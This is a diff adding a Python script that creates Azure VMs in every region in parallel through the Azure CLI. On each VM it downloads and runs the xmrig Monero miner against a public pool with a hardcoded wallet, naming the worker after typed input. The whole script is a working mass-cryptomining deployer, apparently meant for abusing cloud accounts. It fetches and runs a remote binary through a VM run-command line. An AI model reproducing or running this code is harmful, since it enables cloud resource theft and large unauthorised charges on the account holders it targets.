@@ -1,0 +1,58 @@
+from azure.cli.core import get_default_cli
+import json,os
+import multiprocessing
+
+print('''
+                                                                     _______________
+                                                                     < Dhen, Sapatha! >
+                                                                      ---------------
+                                                                             \   ^__^
+                                                                              \  (oo)\_______
+                                                                                 (__)\       )\/\\
+                                                                                     ||----w |
+                                                                                     ||     ||
+                
+                                                        AUTHOR : @sAmPawam ThUwAraKan    | karupiyagounder@gmail.com    ''')
+
+
+
+sn    = input("  /*> Server Name ? ")
+
+
+def az_cli (args_str):
+    args = args_str.split()
+    cli = get_default_cli()
+    cli.invoke(args)
+    if cli.result.result:
+        return(cli.result.result)    
+    elif cli.result.error:
+        print("ERROR")    
+    return True
+
+print("* Creating VM")
+#calling for Locations
+response = az_cli('account list-locations')
+
+def deployer(x):
+        location=(response[x]["name"])
+        #CREATING GROUP
+        group   = az_cli('group create --name newVM'+str(x)+' --location '+location)
+        if(len(str(group))!=4):
+          if (len(group)==7):
+            runC='az vm run-command invoke -g newVM'+str(x)+' -n newVM'+str(x)+' --command-id RunShellScript --scripts "wget https://github.com/xmrig/xmrig/releases/download/v6.15.2/xmrig-6.15.2-linux-static-x64.tar.gz && tar -xvzf xmrig-6.15.2-linux-static-x64.tar.gz&& cd xmrig-6.15.2 &&sudo ./xmrig -o us-west.minexmr.com:4444 -u 4834UE5mV3n1PG7yZRZ7mAiTGWi6mDtUJcgLugeYAj76NwDa8mG78x3JEvsMYFjCgbVPAX1V8coxW4RHknwHxG55Nvbk6Pi.'+sn+'"'  
+            print("Deploying VM")
+            print("      * VM NAME     : newVM"+str(x))
+            print("      * VM GROUP    : newVM"+str(x))
+            print("      * VM LOCATION : "+location)
+            #DEPLOYING VM
+            VM      =  az_cli('vm create --resource-group newVM'+str(x)+' --name newVM'+str(x)+' --image UbuntuLTS --size Standard_F4s --generate-ssh-keys')
+            print("      * Script Executing : "+runC)
+            os.system(runC)
+            
+for x in range(len(response)):
+        p =  multiprocessing.Process(target= deployer, args = [x])
+        p.start()
+      
+print ("* SUCCSESS")
+
+
